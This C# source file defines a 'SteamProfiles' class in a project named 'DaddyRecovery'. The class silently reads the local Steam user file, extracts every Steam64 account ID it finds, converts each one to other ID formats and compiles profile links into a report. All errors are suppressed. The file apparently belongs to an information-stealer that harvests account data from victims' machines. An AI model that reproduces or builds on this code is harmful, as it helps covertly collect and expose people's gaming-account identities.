namespace DaddyRecovery.Applications.Steam
{
    using System;
    using Helpers;
    using System.Globalization;
    using System.IO;
    using System.Text;
    using System.Text.RegularExpressions;

    public static class SteamProfiles
    {
        private const string Pattern = "(\\d{17})|\"\"\\s+\"(\\S+)\"";

        public static string GetSteamID(string httpsurl = "https://steamcommunity.com/profiles/")
        {
            var build = new StringBuilder();
            try
            {
                foreach (Match match in new Regex(Pattern).Matches(File.ReadAllText(GlobalPath.SteamUserPath)))
                {
                    try
                    {
                        if (match.Success && Regex.IsMatch(match.Groups[1].Value, SteamConverter.STEAM64))
                        {
                            string ConvertID = SteamConverter.FromSteam64ToSteam2(Convert.ToInt64(match.Groups[1].Value));
                            string ConvertSteam3 = $"{SteamConverter.STEAMPREFIX}{SteamConverter.FromSteam64ToSteam32(Convert.ToInt64(match.Groups[1].Value)).ToString(CultureInfo.InvariantCulture)}";

                            build.AppendLine($"Steam2ID: {ConvertID}");
                            build.AppendLine($"Steam3_x32: {ConvertSteam3}");
                            build.AppendLine($"Steam3_x64: {match.Groups[1].Value}");
                            build.AppendLine($"User Profile: {httpsurl}{match.Groups[1].Value}{Environment.NewLine}");
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return build?.ToString();
        }
    }
}